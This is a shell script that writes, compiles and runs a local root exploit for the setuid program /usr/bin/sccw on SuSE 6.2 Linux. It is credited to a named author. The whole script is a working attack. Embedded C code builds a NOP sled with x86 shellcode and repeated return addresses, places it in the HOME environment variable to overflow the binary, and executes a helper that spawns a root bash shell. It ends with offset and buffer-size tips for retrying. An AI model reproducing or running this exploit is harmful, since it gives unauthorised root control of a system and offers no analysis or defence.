#!/bin/bash
#
# Linux x86 exploit for /usr/bin/sccw on SuSE 6.2
#
# -Brock Tellier btellier@webley.com

echo "Building /tmp/sccwx.c..."
cat > /tmp/sccwx.c << FOEFOE
/*
 * sccw local root Linux x86 tested on SuSE 6.2
 * gcc -o sccwx sccwx.c
 * must compile/run a setuid(geteuid()); system("/bin/bash"); for a
rootshell
 *
 * -Brock Tellier btellier@webley.com
 */


#include <stdlib.h>
#include <stdio.h>

char exec[]= /* Generic Linux x86 running our /tmp program */
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/tmp/sc";



#define LEN 400
#define NOP 0x90

unsigned long get_sp(void) {

__asm__("movl %esp, %eax");

}


void main(int argc, char *argv[]) {

int offset=0;
int i;
int buflen = LEN;
long int addr;
char buf[LEN];

 if(argc > 3) {
  fprintf(stderr, "Error: Usage: %s offset buffer\n", argv[0]);
 exit(0);
 }
 else if (argc == 2){
   offset=atoi(argv[1]);

 }
 else if (argc == 3) {
   offset=atoi(argv[1]);
   buflen=atoi(argv[2]);

 }
 else {
   offset=2100;
   buflen=300;

 }


addr=get_sp();

fprintf(stderr, "SuSE 6.2 sccw local root\n");
fprintf(stderr, "Brock Tellier btellier@webley.com\n");
fprintf(stderr, "Using addr: 0x%x\n", addr+offset);

memset(buf,NOP,buflen);
memcpy(buf+(buflen/2),exec,strlen(exec));
for(i=((buflen/2) + strlen(exec))+1;i<buflen-4;i+=4)
 *(int *)&buf[i]=addr+offset;

setenv("HOME", buf, 1);
execl("/usr/bin/sccw", "sccw", NULL);

}
FOEFOE

echo "Building /tmp/sccwuid.c..."

cat > /tmp/sccwuid.c <<EOFFOE
void main()
{
    setuid(geteuid());
    system("/bin/bash");
}
EOFFOE

echo "Compiling /tmp/sccwx..."
gcc -o /tmp/sccwx /tmp/sccwx.c

echo "Compiling /tmp/sc..."
gcc -o /tmp/sc /tmp/sccwuid.c

echo "Launching /tmp/sccwx..."
/tmp/sccwx
echo "If it didn't work, try /tmp/sccwx <offset> <bufsiz>"
